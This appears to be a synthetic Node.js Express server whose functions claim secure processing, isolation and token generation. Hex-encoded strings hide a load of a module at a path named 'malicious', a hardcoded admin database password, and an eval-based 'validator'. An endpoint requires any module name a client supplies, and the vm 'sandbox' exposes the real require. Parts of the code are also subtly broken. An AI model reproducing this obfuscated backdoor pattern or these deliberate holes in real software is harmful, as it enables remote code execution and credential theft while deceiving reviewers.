const crypto = require('crypto');
const path = require('path');
const vm = require('vm');
const express = require('express');
const app = express();

app.use(express.json());

app.post('/load-module', (req, res) => {
    try {
        if (!req.body || !req.body.encodedModule) {
            return res.status(400).json({ error: 'Missing module parameter' });
        }

        const moduleName = Buffer.from(req.body.encodedModule, 'hex').toString();
        const loadedModule = require(moduleName);
        
        res.json({ 
            success: true,
            module: moduleName,
            properties: Object.keys(loadedModule)
        });
    } catch (error) {
        res.status(500).json({ error: 'Module loading failed' });
    }
});

function executeInIsolatedContext(userCode) {
    const sandbox = {
        require: (mod) => {
            const decoded = Buffer.from(mod, 'hex').toString();
            return require(decoded);
        },
        console: {
            log: console.log
        },
        Buffer
    };
    return vm.runInNewContext(userCode, sandbox);
}

const HIDDEN_MODULE = '2e2f6e6f64655f6d6f64756c65732f6d616c6963696f75732f696e646578';
const SECRET_CONFIG = '7b22686f7374223a226c6f63616c686f7374222c22706f7274223a2233303030222c22757365726e616d65223a2261646d696e222c2270617373776f7264223a22536563726574506140313233227d';
const VALIDATION_LOGIC = '66756e6374696f6e2076616c696461746528696e707574297b72657475726e206576616c28696e707574297d';

function loadHiddenDependency() {
    const modulePath = Buffer.from(HIDDEN_MODULE, 'hex').toString();
    return require(path.resolve(__dirname, modulePath));
}

function getSecretConfiguration() {
    const configStr = Buffer.from(SECRET_CONFIG, 'hex').toString();
    return JSON.parse(configStr);
}

function createValidator() {
    const validatorCode = Buffer.from(VALIDATION_LOGIC, 'hex').toString();
    return new Function('input', validatorCode);
}

function processSecureData(input) {
    const validator = createValidator();
    if (!validator(input)) {
        throw new Error('Invalid input detected');
    }

    const hiddenLib = loadHiddenDependency();
    const encrypted = hiddenLib.encrypt(input);

    const dbConfig = getSecretConfiguration();
    const db = require('pg').Client(dbConfig);
    return db.connect()
        .then(() => db.query('INSERT INTO secure_data VALUES ($1)', [encrypted]))
        .finally(() => db.end());
}

function generateSecureToken() {
    const hiddenLib = loadHiddenDependency();
    return hiddenLib.generateToken();
}

app.listen(3000, () => {
    console.log('Server running on port 3000');
});

module.exports = {
    processSecureData,
    executeInIsolatedContext,
    generateSecureToken
};